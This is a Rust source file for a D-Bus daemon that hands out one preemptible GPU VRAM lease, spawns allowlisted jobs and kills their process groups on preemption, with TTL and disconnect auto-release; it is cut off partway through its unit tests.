//! `lease` — the unified VRAM coordinator daemon (ADR-0006 control plane + ADR-0010).
//!
//! This is `coord` × `lease` merged into one process: it serves the **single exclusive,
//! preemptible VRAM lease** over the session bus AND owns the batch children, so a
//! preemption actually SIGKILLs the running job and reclaims VRAM — the headline behaviour
//! that the two earlier slices proved separately, now joined. ADR-0006 routes Hermes → a
//! D-Bus lease call → agentosd; this is the agentosd side.
//!
//! Two holder kinds, one lever:
//!   * **Cooperative** (`Acquire`): the caller runs + owns its own GPU process (Hermes
//!     interactive inference via the gateway) and must `Release` when done. agentosd owns
//!     nothing here — and never needs to, because `interactive` is the top tier (it
//!     preempts, is never preempted).
//!   * **Owned** (`Spawn`): agentosd spawns the job (ComfyUI/overnight batch) and holds its
//!     PID, so it can SIGKILL it on preemption (ADR-0009/0010 §5). The SIGKILL lever only
//!     ever lands on these.
//!
//! A higher-tier `Acquire`/`Spawn` that preempts the current owned holder SIGKILLs that
//! child (own-PID evict; `POST /free` is never on the path). A background supervisor reaps
//! a naturally-exited owned child and auto-releases its lease. Monotonic lease tokens mean
//! a preempted holder's stale `Release` (or its late supervisor reap) can't free a
//! successor's lease.
//!
//! The decision is the same deterministic core as `coord`: `admit` (predict-before-load,
//! ADR-0010 §4) + `arbitrate` (priority, §1/§2) + the pure, unit-tested `LeaseState`
//! (token issue/revoke). zbus + the owned-child plumbing are the thin shell (model
//! proposes, code disposes: no model output reaches the lease).
//!
//! Scope (ADR-0001): a lease server + process supervisor, not a scheduler. There is no
//! wait-queue yet — a losing acquirer is told `queued` and retries (real backpressure
//! comes from the gateway holding inference responses, ADR-0006). A revoke *signal* for
//! cooperative holders, and the Hermes plugin that calls this, are the remaining work.

use std::process::Stdio;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::time::{Duration, Instant};

use nvml_wrapper::Nvml;
use tokio::process::{Child, Command};
use tokio::sync::Mutex;

use crate::coord::{admit, arbitrate, free_mib, Admission, Holder, LeaseDecision, Tier};
use crate::feed::feed_dir;
// The keyhole consumes `keyhole.json` (read-only); the lease daemon publishes its arbitration
// state to a sibling `lease.json` the keyhole producer merges in. Reusing the SAME type both
// sides (de)serialize keeps the contract locked (ADR-0012 §3).
use crate::keyhole::Lease;

/// Safety headroom kept free on a fresh grant (mirrors `coord` / ADR-0004 margins).
const HEADROOM_MIB: u64 = 512;

const BUS_NAME: &str = "org.agentos.Coordinator1";
const OBJ_PATH: &str = "/org/agentos/Coordinator1";

/// Static launch-profile allowlist (ADR-0013 A2). `Spawn` names an *intent*, never a binary —
/// the daemon owns the command vector, so a D-Bus caller can't make agentosd run arbitrary
/// commands. This closes the unauthenticated-RCE Critical (review finding S1): `Spawn(argv)` is
/// gone. `params` are appended as LITERAL argv (execv, no shell) → no injection. A new owned job
/// is a new entry here (a config file is the later step). Profile programs must be absolute so
/// the `looks_executable` pre-flight (H3) actually checks them.
const PROFILES: &[(&str, &[&str])] = &[
    // The dreaming/overnight ComfyUI the daemon owns + can SIGKILL (ADR-0009/0010 §5).
    ("comfyui", &["/home/corey/Documents/AgentOS/spikes/dreaming/start-comfyui.sh"]),
    // A harmless stand-in for smoke-testing the lease plumbing (params e.g. ["600"]).
    ("sleep", &["/usr/bin/sleep"]),
];

/// Resolve a profile name to its daemon-owned base argv, or `None` if not allowlisted.
fn resolve_profile(name: &str) -> Option<Vec<String>> {
    PROFILES
        .iter()
        .find(|(n, _)| *n == name)
        .map(|(_, argv)| argv.iter().map(|s| s.to_string()).collect())
}

fn profile_names() -> String {
    PROFILES.iter().map(|(n, _)| *n).collect::<Vec<_>>().join(", ")
}

/// Lease TTL backstop (ADR-0013 B5): a holder past this without a `Renew` is auto-expired, so a
/// stuck/buggy holder — or an owned job whose `Spawn` caller crashed (the gap B4 leaves) — can't
/// hold the lane forever. Default covers a full Wan 14B dream (~1 hr); `Renew` extends. Tunable
/// via `AGENTOSD_LEASE_TTL_SECS` (operational knob; also lets tests use a short value).
fn lease_ttl() -> Duration {
    let s = std::env::var("AGENTOSD_LEASE_TTL_SECS").ok().and_then(|s| s.parse().ok()).unwrap_or(5400);
    Duration::from_secs(s)
}

/// Anti-strobe dwell (ADR-0013 C7): a just-preempted tier can't re-acquire for this long, so
/// bursty interactive load can't drive spawn→preempt→spawn churn (ComfyUI relaunch is costly).
/// Tunable via `AGENTOSD_PREEMPT_DWELL_SECS`.
fn preempt_dwell() -> Duration {
    let s = std::env::var("AGENTOSD_PREEMPT_DWELL_SECS").ok().and_then(|s| s.parse().ok()).unwrap_or(8);
    Duration::from_secs(s)
}

/// C7: is `req` still in its post-preempt cooldown? Interactive is exempt — top priority must
/// never be delayed. Pure + tested (the time source is injected).
fn cooling_down(cooldown: Option<(Tier, Instant)>, req: Tier, now: Instant) -> bool {
    matches!(cooldown, Some((t, until)) if t == req && req != Tier::Interactive && now < until)
}

// ---------------------------------------------------------------------------
// Pure lease state machine (the only new decision logic — unit-tested below).
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
struct Held {
    tier: Tier,
    token: u64,
    /// The footprint this holder was admitted for — so a preempt can predict the free
    /// VRAM after evicting it (H1: complete the preempt decision, not just priority).
    est_mib: u64,
}

/// Outcome of an `acquire` against the single lease.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum AcquireResult {
    /// Lease was free and the footprint fit → granted with a fresh token.
    Granted { token: u64 },
    /// A higher tier displaced a lower holder → granted; `victim` must be evicted.
    Preempted { token: u64, victim: u64 },
    /// Held by an equal-or-higher tier → the requester must wait/retry.
    Queued,
    /// Lease was free but predict-before-load refused (would not fit) — ADR-0010 §4.
    Denied,
}

/// The single exclusive lease (ADR-0010 §1). Tokens are monotonic so a stale `Release`
/// from a preempted holder can't free a successor's lease.
#[derive(Debug)]
pub struct LeaseState {
    holder: Option<Held>,
    next_token: u64,
}

impl LeaseState {
    pub fn new() -> Self {
        LeaseState { holder: None, next_token: 1 }
    }

    /// Decide + mutate. `admission` (computed from live NVML by the caller) keeps NVML
    /// out of this testable core. Admission gates only a *fresh* grant (predict-before-load,
    /// ADR-0010 §4). A preemption is decided by **priority** (`arbitrate`) — the lower tier
    /// must always yield — and the new holder is installed with its own `est`; the caller
    /// re-checks fit against post-eviction free VRAM (H1) and acts on the verdict.
    pub fn acquire(&mut self, tier: Tier, admission: &Admission) -> AcquireResult {
        let est = admission.est_mib();
        match arbitrate(self.holder.map(|h| Holder { tier: h.tier }), tier) {
            LeaseDecision::Queue => AcquireResult::Queued,
            LeaseDecision::Preempt => {
                // arbitrate returns Preempt only when a holder exists.
                let Some(victim) = self.holder else { return AcquireResult::Queued };
                let token = self.install(tier, est);
                AcquireResult::Preempted { token, victim: victim.token }
            }
            LeaseDecision::Grant => {
                if !admission.granted() {
                    return AcquireResult::Denied;
                }
                let token = self.install(tier, est);
                AcquireResult::Granted { token }
            }
        }
    }

    /// Release the lease iff `token` is the current holder's (monotonic-token guard).
    pub fn release(&mut self, token: u64) -> bool {
        if self.holder.map(|h| h.token) == Some(token) {
            self.holder = None;
            true
        } else {
            false
        }
    }

    pub fn holder_tier(&self) -> Option<Tier> {
        self.holder.map(|h| h.tier)
    }

    pub fn holder_token(&self) -> u64 {
        self.holder.map_or(0, |h| h.token)
    }

    /// The current holder's admitted footprint estimate (for the preempt fit re-check).
    pub fn holder_est(&self) -> Option<u64> {
        self.holder.map(|h| h.est_mib)
    }

    /// Issue a fresh token and install `tier` (admitted for `est_mib`) as the sole holder.
    fn install(&mut self, tier: Tier, est_mib: u64) -> u64 {
        let token = self.next_token;
        self.next_token += 1;
        self.holder = Some(Held { tier, token, est_mib });
        token
    }
}

impl Default for LeaseState {
    fn default() -> Self {
        Self::new()
    }
}

// ---------------------------------------------------------------------------
// Owned-child plumbing (the impure shell — kept out of the tested core).
// ---------------------------------------------------------------------------

/// A batch job agentosd spawned and owns, so it can SIGKILL it on preemption.
struct OwnedJob {
    token: u64,
    child: Child,
    pid: u32,
    label: String,
}

/// The daemon's shared mutable state: the lease decision + the at-most-one owned child
/// (one lease holder → at most one owned process). One `Mutex` keeps the lease and the
/// child it controls atomically consistent.
struct Inner {
    lease: LeaseState,
    owned: Option<OwnedJob>,
    /// Human narration of the preempt that shaped the current holder, for the keyhole's
    /// arbitration line ("" = no contention). Set on preempt, cleared on a fresh/idle lease.
    last_preempt: String,
    /// The D-Bus unique name of the current holder + its token (ADR-0013 B4). When that peer
    /// disconnects (crash), the supervisor auto-releases the lease so a dead holder can't wedge
    /// the lane forever (finding H4). `None` for a holder with no bus name (owned jobs).
    holder_peer: Option<(u64, String)>,
    /// When the current holder's lease expires absent a `Renew` (ADR-0013 B5). `None` = no holder.
    holder_deadline: Option<Instant>,
    /// A just-preempted tier and when its anti-strobe cooldown ends (ADR-0013 C7).
    cooldown: Option<(Tier, Instant)>,
}

impl Inner {
    fn new() -> Self {
        Inner {
            lease: LeaseState::new(),
            owned: None,
            last_preempt: String::new(),
            holder_peer: None,
            holder_deadline: None,
            cooldown: None,
        }
    }
}

/// Basename of the launched program (argv[0]) — the keyhole's `holder` for an owned job.
fn short_label(label: &str) -> String {
    label
        .split_whitespace()
        .next()
        .map(|p| p.rsplit('/').next().unwrap_or(p).to_string())
        .unwrap_or_default()
}

/// Snapshot the current holder into the keyhole's lease-mirror contract. Cheap — call it while
/// holding `Inner`, then write OFF the lock. No holder → all-empty (the UI shows "no contention").
/// A cooperative holder has no agentosd-known name, so `holder` stays empty (honest, not faked).
fn lease_snapshot(inner: &Inner) -> Lease {
    match inner.lease.holder_tier() {
        Some(t) => {
            let token = inner.lease.holder_token();
            let holder = inner
                .owned
                .as_ref()
                .filter(|j| j.token == token)
                .map(|j| short_label(&j.label))
                .unwrap_or_default();
            Lease { tier: t.as_str().to_string(), holder, preempt: inner.last_preempt.clone() }
        }
        None => Lease::default(),
    }
}

/// Atomic temp+rename publish of the lease mirror, ALWAYS called OFF the `Inner` lock
/// (ADR-0012 §3): a keyhole render reading this file must never be able to delay a SIGKILL, so
/// observation is strictly downstream of a file the daemon writes. Best-effort / fail-open — a
/// failed write just leaves the keyhole showing "no contention".
fn write_lease_mirror(path: Option<&Path>, snap: &Lease) {
    let Some(path) = path else { return };
    let Ok(json) = serde_json::to_string(snap) else { return };
    let tmp = path.with_file_name(format!(".lease.{}.tmp", std::process::id()));
    if std::fs::write(&tmp, json).is_ok() {
        let _ = std::fs::rename(&tmp, path);
    }
}

fn spawn_owned(argv: &[String]) -> std::io::Result<(Child, u32)> {
    let mut it = argv.iter();
    let prog = it
        .next()
        .ok_or_else(|| std::io::Error::new(std::io::ErrorKind::InvalidInput, "empty argv"))?;
    let child = Command::new(prog)
        .args(it)
        // Own process group (R1): the child is its own group leader (pgid == pid), so a
        // launcher that forks workers (e.g. ComfyUI) is reclaimed as a whole group on evict.
        .process_group(0)
        .stdin(Stdio::null())
        // Fail-safe (ADR-0003): never leak an owned GPU process if the daemon dies.
        .kill_on_drop(true)
        .spawn()?;
    // A spawned child has a pid until reaped; None only if it died instantly → spawn anomaly.
    let pid = child
        .id()
        .ok_or_else(|| std::io::Error::other("child exited before id()"))?;
    Ok((child, pid))
}

/// Best-effort executable pre-flight so a bad `argv[0]` is caught *before* we evict an
/// incumbent (H3): only checks an absolute/relative path; a bare PATH name passes through.
fn looks_executable(prog: &str) -> bool {
    use std::os::unix::fs::PermissionsExt;
    if !prog.contains('/') {
        return true; // resolved via PATH at spawn time; can't cheaply check here
    }
    std::fs::metadata(prog)
        .map(|m| m.is_file() && m.permissions().mode() & 0o111 != 0)
        .unwrap_or(false)
}

/// SIGKILL the whole process group led by `pid` (set via `process_group(0)`), so a forking
/// owned job is fully reclaimed — `POST /free` is never trusted (ADR-0010 §5, finding R1).
fn sigkill_group(pid: u32) {
    // Safe: a kill(2) syscall with a constant signal; negative pid targets the group.
    unsafe {
        libc::kill(-(pid as i32), libc::SIGKILL);
    }
}

/// Scaled safety headroom (H5 partial): self-reported model sizes undercount (ADR-0004
/// measured 19.5 GB for an 18 GB-reported model), so a flat 512 MiB is too thin on big
/// models. Keep ≥6% of the estimate, floored at the base headroom.
fn headroom_for(est_mib: u64) -> u64 {
    (est_mib / 16).max(HEADROOM_MIB)
}

/// H1: complete the preempt decision. After evicting the victim, will the successor fit?
/// Predicted free = current free + the victim's admitted footprint *iff we actually own
/// (and thus reclaim) it*; a cooperative victim frees nothing agentosd controls. Pure +
/// tested — the kill is authorized by priority, this just makes the consequence explicit.
fn fits_after_evict(free_mib: u64, victim_est: u64, reclaimable: bool, succ_est: u64, headroom: u64) -> bool {
    let predicted = if reclaimable { free_mib.saturating_add(victim_est) } else { free_mib };
    admit(predicted, succ_est, headroom).granted()
}

/// Release `token` — shared by the `Release` method and the peer-disconnect listener (B4).
/// True iff it was the holder. Group-SIGKILLs + reaps an owned child, clears narration +
/// holder-peer when the lease goes idle, and republishes the keyhole mirror OFF the lock.
async fn release_token(inner: &Arc<Mutex<Inner>>, mirror: Option<&Path>, token: u64) -> bool {
    let (freed, to_reap, snap) = {
        let mut g = inner.lock().await;
        let freed = g.lease.release(token);
        let mut to_reap: Option<(Child, u32)> = None;
        if freed {
            if let Some(job) = g.owned.take() {
                if job.token == token {
                    to_reap = Some((job.child, job.pid));
                } else {
                    g.owned = Some(job);
                }
            }
            if g.holder_peer.as_ref().is_some_and(|(t, _)| *t == token) {
                g.holder_peer = None;
            }
            g.holder_deadline = None; // B5: no holder → no deadline
            if g.lease.holder_tier().is_none() {
                g.last_preempt.clear();
            }
        }
        (freed, to_reap, lease_snapshot(&g))
    };
    if freed {
        write_lease_mirror(mirror, &snap);
        if let Some((mut child, pid)) = to_reap {
            sigkill_group(pid);
            tokio::spawn(async move {
                let _ = child.wait().await; // reap the leader (no zombie)
            });
        }
    }
    freed
}

// ---------------------------------------------------------------------------
// D-Bus shell (zbus, session bus, tokio reactor).
// ---------------------------------------------------------------------------

struct Coordinator {
    inner: Arc<Mutex<Inner>>,
    nvml: Arc<Nvml>,
    /// `$XDG_RUNTIME_DIR/nimbus-aurora/lease.json` — the keyhole's arbitration mirror, or None
    /// if the runtime dir is unavailable (the daemon still runs; the keyhole shows no contention).
    mirror: Option<PathBuf>,
}

impl Coordinator {
    /// Shared path for both `Acquire` (cooperative, `argv = None`) and `Spawn`
    /// (owned, `argv = Some`). The lock is held across the decision AND the
    /// spawn/evict so the lease and the child it controls never disagree.
    async fn do_acquire(
        &self,
        caller: Option<String>,
        tier_name: String,
        estimate_mib: u32,
        argv: Option<Vec<String>>,
    ) -> (bool, u64, String) {
        use std::fmt::Write as _;

        let tier = match Tier::from_arg(&tier_name) {
            Ok(t) => t,
            Err(e) => return (false, 0, format!("error: {e}")),
        };
        let est = estimate_mib as u64;
        let headroom = headroom_for(est);

        // H3: pre-flight the binary BEFORE we lock/evict, so a bad argv can't destroy an
        // incumbent. (PATH-relative names pass through; resolved at spawn time.)
        if let Some(args) = argv.as_deref() {
            if args.is_empty() {
                return (false, 0, "spawn: empty argv".into());
            }
            if !looks_executable(&args[0]) {
                return (false, 0, format!("spawn: `{}` is not an executable file", args[0]));
            }
        }

        // R2: distinguish "couldn't read VRAM" (None) from "0 free".
        let free_opt = free_mib(&self.nvml).await;

        let mut inner = self.inner.lock().await;
        let prev_est = inner.lease.holder_est().unwrap_or(0);
        let prev_tier = inner.lease.holder_tier();

        // C7: a just-preempted tier must wait out its dwell before re-acquiring (anti-strobe).
        if cooling_down(inner.cooldown, tier, Instant::now()) {
            return (
                false,
                0,
                format!(
                    "cooling down: {} was preempted recently — retry shortly (anti-strobe, ADR-0013 C7)",
                    tier.as_str()
                ),
            );
        }

        // Fresh-grant admissibility, with fail-open per tier (ADR-0003): on an unreadable
        // GPU, interactive (top tier) grants anyway — never block live AI on a read blip —
        // while batch/best-effort fail *closed* (don't start a heavy job blind).
        let admit_ok = match free_opt {
            Some(free) => admit(free, est, headroom).granted(),
            None => tier == Tier::Interactive,
        };
        let admission = if admit_ok {
            Admission::Grant { free_mib: free_opt.unwrap_or(0), est_mib: est, headroom_mib: headroom }
        } else {
            Admission::Deny {
                free_mib: free_opt.unwrap_or(0),
                est_mib: est,
                headroom_mib: headroom,
                short_mib: 0,
            }
        };

        // preempted = Some((victim_token, fit_verdict)); fit verdict completes the decision (H1).
        let (token, preempted) = match inner.lease.acquire(tier, &admission) {
            AcquireResult::Queued => {
                return (
                    false,
                    0,
                    format!(
                        "queued: lease held by {} (token {})",
                        inner.lease.holder_tier().map_or("?", Tier::as_str),
                        inner.lease.holder_token()
                    ),
                );
            }
            AcquireResult::Denied => {
                let msg = match free_opt {
                    None => format!(
                        "declined: VRAM unreadable — {} batch fails closed (won't start blind); \
                         interactive would fail open",
                        tier.as_str()
                    ),
                    Some(free) => {
                        let short = match admit(free, est, headroom) {
                            Admission::Deny { short_mib, .. } => short_mib,
                            _ => 0,
                        };
                        format!("denied: short {short}M (free {free}M vs est {est}M + headroom {headroom}M)")
                    }
                };
                return (false, 0, msg);
            }
            AcquireResult::Granted { token } => (token, None),
            AcquireResult::Preempted { token, victim } => {
                // H1: re-verify fit against PREDICTED post-eviction free (current + the
                // victim's admitted footprint, iff we actually own/reclaim it). The kill is
                // authorized by priority; this completes the *decision* and warns the caller.
                let reclaimable = inner.owned.as_ref().is_some_and(|j| j.token == victim);
                let fit = match free_opt {
                    Some(free) => {
                        if fits_after_evict(free, prev_est, reclaimable, est, headroom) {
                            "fits"
                        } else {
                            "WONT-FIT"
                        }
                    }
                    None => "fit-unknown",
                };
                // C7: start the evicted tier's anti-strobe cooldown.
                inner.cooldown = prev_tier.map(|t| (t, Instant::now() + preempt_dwell()));
                (token, Some((victim, fit)))
            }
        };

        // Evict the previously-owned child on preemption — carry the Child OUT so we can
        // reap it (H2) rather than drop-and-hope; SIGKILL the whole group (R1).
        let mut evicted_child: Option<Child> = None;
        let mut evicted_info: Option<(u64, String, u32, &'static str)> = None;
        if let Some((victim, fit)) = preempted {
            if let Some(job) = inner.owned.take() {
                if job.token == victim {
                    evicted_info = Some((job.token, job.label.clone(), job.pid, fit));
                    evicted_child = Some(job.child);
                } else {
                    inner.owned = Some(job); // not the victim (shouldn't happen) — keep it
                }
            }
        }

        // Narrate the contention for the keyhole's arbitration line (set under the lock,
        // published off it). A fresh, uncontended grant clears it → "no contention".
        inner.last_preempt = match (preempted, &evicted_info) {
            (Some((_, fit)), Some((_, label, _, _))) => {
                format!("{} preempted `{}` ({fit})", tier.as_str(), short_label(label))
            }
            (Some((victim, fit)), None) => {
                format!("{} preempted token {victim} ({fit})", tier.as_str())
            }
            _ => String::new(),
        };

        // `Spawn` requests: agentosd spawns + OWNS the child. On spawn failure, roll the
        // lease back (a lease without its process is worse than no lease) and reap any victim.
        if let Some(args) = argv.as_deref() {
            match spawn_owned(args) {
                Ok((child, pid)) => {
                    inner.owned = Some(OwnedJob { token, child, pid, label: args.join(" ") });
                }
                Err(e) => {
                    inner.lease.release(token);
                    drop(inner);
                    if let Some((vt, label, pid, _)) = evicted_info {
                        eprintln!("coordd: spawn failed after preempting token {vt} (`{label}` pid {pid})");
                        sigkill_group(pid);
                    }
                    if let Some(mut ch) = evicted_child {
                        let _ = ch.wait().await;
                    }
                    // Lease rolled back → publish "no contention" (off-lock; inner is dropped).
                    write_lease_mirror(self.mirror.as_deref(), &Lease::default());
                    return (false, 0, format!("spawn failed: {e}"));
                }
            }
        }

        // Record the caller's bus name for peer-disconnect auto-release (B4) — but ONLY for a
        // *cooperative* holder, whose own process IS the GPU user: if it crashes, free the lease
        // so the lane can't wedge (finding H4). An *owned* (`Spawn`) job is decoupled from the
        // caller's connection — the daemon owns the child, the caller may disconnect between
        // `Spawn` and `Release` (e.g. `busctl`-per-call) — so its liveness is the child's, not
        // the peer's (tracked by the supervisor / Release / preempt, with a TTL the remaining gap).
        inner.holder_peer = if argv.is_none() { caller.map(|c| (token, c)) } else { None };
        inner.holder_deadline = Some(Instant::now() + lease_ttl()); // B5: start the TTL clock

        let owned_pid = inner.owned.as_ref().filter(|j| j.token == token).map(|j| j.pid);
        let mirror_snap = lease_snapshot(&inner);
        drop(inner);

        if let Some((vt, label, pid, fit)) = evicted_info {
            println!(
                "coordd: PREEMPT token {vt} → SIGKILL group of `{label}` pid {pid} \
                 (own-PID/group evict, ADR-0010 §5; successor {fit})"
            );
            sigkill_group(pid);
            if let Some(child) = evicted_child {
                self.spawn_reclaim_task(child, free_opt.unwrap_or(0));
            }
        }

        // Publish the new arbitration state to the keyhole mirror — OFF the lock (ADR-0012 §3).
        write_lease_mirror(self.mirror.as_deref(), &mirror_snap);

        let mut msg = match preempted {
            Some((victim, fit)) => {
                format!("granted {} token {token}; preempted token {victim} ({fit})", tier.as_str())
            }
            None => format!("granted {} token {token}", tier.as_str()),
        };
        match free_opt {
            Some(free) => { let _ = write!(msg, " (free {free}M)"); }
            None => msg.push_str(" (free unknown)"),
        }
        if let Some(pid) = owned_pid {
            let _ = write!(msg, "; agentosd owns pid {pid}");
        }
        // H1: a granted-but-won't-fit preempt is loud — the successor must offload/shrink.
        if matches!(preempted, Some((_, "WONT-FIT"))) {
            eprintln!(
                "coordd: WARNING token {token} granted but WONT-FIT after eviction — \
                 successor must offload/shrink (ADR-0004)"
            );
        }
        (true, token, msg)
    }

    /// Reap an evicted/released child, then prove reclaim. The SIGKILL (to the group) has
    /// already been sent; we `wait()` the leader so the Δ is read after *actual* exit (H2),
    /// not a fixed-sleep guess. Off the response path so the handler stays snappy.
    fn spawn_reclaim_task(&self, mut child: Child, before: u64) {
        let nvml = Arc::clone(&self.nvml);
        tokio::spawn(async move {
            let _ = child.wait().await; // reap the leader (no zombie)
            tokio::time::sleep(Duration::from_millis(150)).await; // brief driver settle
            if let Some(after) = free_mib(&nvml).await {
                println!(
                    "coordd: post-evict free {after}M (was {before}M; Δ {}M reclaimed)",
                    after.saturating_sub(before)
                );
            }
        });
    }
}

#[zbus::interface(name = "org.agentos.Coordinator1")]
impl Coordinator {
    /// Cooperative lease: the caller runs + owns its own GPU process (e.g. Hermes
    /// interactive inference) and must `Release` when done. agentosd owns nothing.
    /// `(granted, token, outcome)`; `token` is 0 when not granted.
    async fn acquire(
        &self,
        #[zbus(header)] hdr: zbus::message::Header<'_>,
        tier: String,
        estimate_mib: u32,
    ) -> (bool, u64, String) {
        let caller = hdr.sender().map(|s| s.to_string());
        self.do_acquire(caller, tier, estimate_mib, None).await
    }

    /// Owned lease via a daemon-owned launch *profile* (ADR-0013 A2 — no caller-supplied
    /// binary). `profile` names an allowlisted command (`PROFILES`); `params` are appended as
    /// literal args (no shell). agentosd spawns + holds the PID so it can SIGKILL it on
    /// preemption (the overnight batch / ComfyUI pattern, ADR-0009/0010 §5).
    async fn spawn(
        &self,
        #[zbus(header)] hdr: zbus::message::Header<'_>,
        tier: String,
        estimate_mib: u32,
        profile: String,
        params: Vec<String>,
    ) -> (bool, u64, String) {
        let Some(mut argv) = resolve_profile(&profile) else {
            return (false, 0, format!("spawn: unknown profile `{profile}` (allowed: {})", profile_names()));
        };
        argv.extend(params);
        let caller = hdr.sender().map(|s| s.to_string());
        self.do_acquire(caller, tier, estimate_mib, Some(argv)).await
    }

    /// Release the lease (true iff `token` is the current holder's). If that holder is an
    /// agentosd-owned job, its process group is SIGKILLed too — releasing means "done with
    /// the GPU" — and the leader is reaped (no zombie).
    async fn release(&self, token: u64) -> bool {
        release_token(&self.inner, self.mirror.as_deref(), token).await
    }

    /// Heartbeat the lease (ADR-0013 B5): extend the holder's TTL. True iff `token` holds. A
    /// long-running holder (a Wan 14B dream, a long inference) calls this periodically; absent a
    /// `Renew`, the supervisor auto-expires the lease so a stuck holder can't wedge the lane.
    async fn renew(&self, token: u64) -> bool {
        let mut inner = self.inner.lock().await;
        if inner.lease.holder_token() == token && inner.lease.holder_tier().is_some() {
            inner.holder_deadline = Some(Instant::now() + lease_ttl());
            true
        } else {
            false
        }
    }

    /// `(held, tier, token, free_mib)` — current lease + live free VRAM.
    async fn status(&self) -> (bool, String, u64, u32) {
        let free = free_mib(&self.nvml).await.unwrap_or(0) as u32;
        let inner = self.inner.lock().await;
        match inner.lease.holder_tier() {
            Some(t) => (true, t.as_str().to_string(), inner.lease.holder_token(), free),
            None => (false, String::new(), 0, free),
        }
    }
}

pub fn run() -> Result<(), Box<dyn std::error::Error>> {
    let rt = tokio::runtime::Builder::new_multi_thread().enable_all().build()?;
    rt.block_on(serve())
}

/// Background supervisor: reap a *naturally*-exited owned child and auto-release its
/// lease. Polls `try_wait` (never holds a `wait` future, so it never races the D-Bus
/// handlers for the child). The monotonic-token guard makes a late reap a safe no-op if
/// the holder has since changed.
async fn supervise(inner: Arc<Mutex<Inner>>, mirror: Option<PathBuf>, conn: zbus::Connection) {
    // For B4 peer-liveness checks. If the proxy can't be built, peer-disconnect detection is
    // simply off (the natural-exit reap still works) — degrade, don't crash.
    let dbus = zbus::fdo::DBusProxy::new(&conn).await.ok();
    loop {
        tokio::time::sleep(Duration::from_millis(750)).await;

        // 1. Reap a *naturally*-exited owned child and auto-release its lease. `try_wait` never
        //    holds a `wait` future, so it can't race the D-Bus handlers for the child. The
        //    monotonic-token guard makes a late reap a safe no-op if the holder has changed.
        let (exited, snap) = {
            let mut g = inner.lock().await;
            let done = match g.owned.as_mut() {
                Some(job) => job
                    .child
                    .try_wait()
                    .ok()
                    .flatten()
                    .map(|status| (job.token, job.label.clone(), status)),
                None => None,
            };
            if let Some((token, _, _)) = &done {
                g.owned = None;
                g.lease.release(*token);
                if g.holder_peer.as_ref().is_some_and(|(t, _)| t == token) {
                    g.holder_peer = None;
                }
                if g.lease.holder_tier().is_none() {
                    g.last_preempt.clear();
                }
            }
            (done, lease_snapshot(&g))
        };
        if let Some((token, label, status)) = exited {
            println!("coordd: owned job `{label}` (token {token}) exited ({status}) → lease released");
            // Publish off-lock (the guard is already dropped) so the keyhole reflects the release.
            write_lease_mirror(mirror.as_deref(), &snap);
        }

        // 2. Peer-disconnect auto-release (ADR-0013 B4): if the lease holder's D-Bus peer has
        //    vanished (crashed without `Release`), free the lease so a dead holder can't wedge
        //    the lane forever (finding H4). Poll-based — reuses this loop, no signal stream.
        if let Some(dbus) = &dbus {
            let peer = { inner.lock().await.holder_peer.clone() };
            if let Some((token, name)) = peer {
                let alive = match zbus::names::BusName::try_from(name.as_str()) {
                    Ok(bn) => dbus.name_has_owner(bn).await.unwrap_or(true), // on error assume alive
                    Err(_) => true,
                };
                if !alive {
                    println!("coordd: holder peer {name} gone → auto-release token {token} (ADR-0013 B4)");
                    release_token(&inner, mirror.as_deref(), token).await;
                }
            }
        }

        // 3. TTL expiry (B5): a holder past its deadline without a Renew is auto-released —
        //    backstops a stuck/buggy holder and an owned job whose Spawn caller crashed.
        let expired = {
            let g = inner.lock().await;
            match (g.lease.holder_token(), g.holder_deadline) {
                (tok, Some(dl)) if tok != 0 && Instant::now() >= dl => Some(tok),
                _ => None,
            }
        };
        if let Some(tok) = expired {
            println!("coordd: lease TTL expired → auto-release token {tok} (ADR-0013 B5)");
            release_token(&inner, mirror.as_deref(), tok).await;
        }
    }
}

async fn serve() -> Result<(), Box<dyn std::error::Error>> {
    let nvml = Arc::new(
        Nvml::init().map_err(|e| format!("NVML init failed (is the NVIDIA driver loaded?): {e}"))?,
    );
    let inner = Arc::new(Mutex::new(Inner::new()));
    let mirror = feed_dir().ok().map(|d| d.join("lease.json"));
    // Publish an initial "no contention" so the keyhole has a file to read from the first tick.
    write_lease_mirror(mirror.as_deref(), &Lease::default());

    let obj = Coordinator { inner: Arc::clone(&inner), nvml, mirror: mirror.clone() };
    let conn = zbus::connection::Builder::session()?
        .name(BUS_NAME)?
        .serve_at(OBJ_PATH, obj)?
        .build()
        .await?;
    // Supervisor needs the connection for B4 peer-liveness checks; keep `conn` alive until exit.
    tokio::spawn(supervise(Arc::clone(&inner), mirror, conn.clone()));

    println!("agentosd coordd — VRAM coordinator daemon serving {BUS_NAME} (ADR-0006/0010)");
    println!("  spawn (owned) : busctl --user call {BUS_NAME} {OBJ_PATH} {BUS_NAME} Spawn susas batch 2000 sleep 1 600");
    println!("  acquire (coop): busctl --user call {BUS_NAME} {OBJ_PATH} {BUS_NAME} Acquire su interactive 5000");
    println!("  status        : busctl --user call {BUS_NAME} {OBJ_PATH} {BUS_NAME} Status");
    println!("  release       : busctl --user call {BUS_NAME} {OBJ_PATH} {BUS_NAME} Release t <token>");
    tokio::signal::ctrl_c().await?;
    println!("agentosd coordd — shutdown");
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn fits() -> Admission {
        admit(20_000, 2_000, HEADROOM_MIB) // plenty of room
    }
    fn wont_fit() -> Admission {
        admit(1_000, 50_000, HEADROOM_MIB) // far too big
    }

    #[test]
    fn short_label_is_basename_of_argv0() {
        assert_eq!(short_label("/usr/bin/python main.py"), "python");
        assert_eq!(short_label("comfyui --port 8188"), "comfyui");
        assert_eq!(short_label(""), "");
    }

    #[test]
    fn mirror_snapshot_idle_is_no_contention() {
        let inner = Inner::new();
        assert_eq!(lease_snapshot(&inner), Lease::default());
    }

    #[test]
    fn mirror_snapshot_reflects_tier_and_preempt_but_not_a_faked_holder() {
        let mut inner = Inner::new();
        // A cooperative interactive holder: agentosd knows the tier, not the process name.
        inner.lease.acquire(Tier::Interactive, &fits());
        inner.last_preempt = "interactive preempted token 1 (fits)".into();
        let snap = lease_snapshot(&inner);
        assert_eq!(snap.tier, "interactive");
        assert_eq!(snap.holder, ""); // honest: not fabricated for a cooperative holder
        assert_eq!(snap.preempt, "interactive preempted token 1 (fits)");
    }

    #[test]
    fn fresh_acquire_grants_token_one() {
        let mut st = LeaseState::new();
